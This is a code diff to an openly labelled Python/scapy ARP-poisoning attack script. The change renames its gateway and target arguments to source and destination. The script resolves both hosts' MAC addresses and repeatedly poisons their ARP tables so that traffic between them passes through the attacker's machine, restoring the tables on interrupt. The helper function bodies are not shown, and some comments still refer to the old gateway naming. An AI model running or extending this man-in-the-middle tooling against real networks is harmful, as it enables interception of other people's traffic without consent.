@@ -4,26 +4,26 @@ import scapy.all as scapy
 import argparse
 import time
 
-def main(gateway_ip, target_ip, interface):
-    target = {
-        'ip': target_ip,
-        'mac': get_mac_address(target_ip, interface)
+def main(target_src_ip, target_dst_ip, interface):
+    target_src = {
+        'ip': target_src_ip,
+        'mac': get_mac_address(target_src_ip, interface)
     }
     
-    gateway = {
-        'ip': gateway_ip,
-        'mac': get_mac_address(gateway_ip, interface)
+    target_dst = {
+        'ip': target_dst_ip,
+        'mac': get_mac_address(target_dst_ip, interface)
     }
 
     attacker_mac = scapy.get_if_hwaddr(interface)
 
-    if not target['mac'] or not gateway['mac']:
-        print("Could not retrieve target or gateway MAC addresses. Exiting.")
+    if not target_src['mac'] or not target_dst['mac']:
+        print("Could not retrieve target src or target dst MAC addresses. Exiting.")
         return
 
     print("Initial state:")
-    print(f"Gateway: {gateway['ip']} ({gateway['mac']})")
-    print(f"Target: {target['ip']} ({target['mac']})")
+    print(f"Source: {target_src['ip']} ({target_src['mac']})")
+    print(f"Destination: {target_dst['ip']} ({target_dst['mac']})")
     print(f"Attacker: ({attacker_mac})")
     print()
 
@@ -36,12 +36,12 @@ def main(gateway_ip, target_ip, interface):
                 should_print = True
             else:
                 should_print = False
-            poison_arp(gateway['ip'], gateway['mac'], target['ip'], attacker_mac, interface, should_print) # Target IP points to attacker on gateway ARP table
-            poison_arp(target['ip'], target['mac'], gateway['ip'], attacker_mac, interface, should_print) # Gateway IP points to attacker on target ARP table
+            poison_arp(target_dst['ip'], target_dst['mac'], target_src['ip'], attacker_mac, interface, should_print) # Target IP points to attacker on gateway ARP table
+            poison_arp(target_src['ip'], target_src['mac'], target_dst['ip'], attacker_mac, interface, should_print) # Gateway IP points to attacker on target ARP table
     except KeyboardInterrupt:
         print("Restoring ARP tables...")
-        restore_arp(target['ip'], target['mac'], gateway['ip'], gateway['mac'], interface) # Gateway IP points to Gateway MAC on target ARP table
-        restore_arp(gateway['ip'], gateway['mac'], target['ip'], target['mac'], interface) # Target IP points to Target MAC on gateway ARP table
+        restore_arp(target_src['ip'], target_src['mac'], target_dst['ip'], target_dst['mac'], interface) # Gateway IP points to Gateway MAC on target ARP table
+        restore_arp(target_dst['ip'], target_dst['mac'], target_src['ip'], target_src['mac'], interface) # Target IP points to Target MAC on gateway ARP table
 
 def get_mac_address(ip, interface):
     try:
@@ -68,13 +68,13 @@ if __name__ == "__main__":
         prog='ARP-Poisoning',
         description='Script for performing ARP poisoning attack'
     )
-    parser.add_argument('-g', '--gateway', help='IPv4 address of the gateway', required=True)
-    parser.add_argument('-t', '--target', help='IPv4 address of the target', required=True)
+    parser.add_argument('-s', '--source', help='IPv4 address of the target source', required=True)
+    parser.add_argument('-d', '--destination', help='IPv4 address of the target destination', required=True)
     parser.add_argument('-i', '--interface', help='Network interface to use', required=True)
     args = parser.parse_args()
         
-    gateway_ip = args.gateway
-    target_ip = args.target
+    target_src_ip = args.source
+    target_dst_ip = args.destination
     interface = args.interface
 
-    main(gateway_ip, target_ip, interface)
+    main(target_src_ip, target_dst_ip, interface)
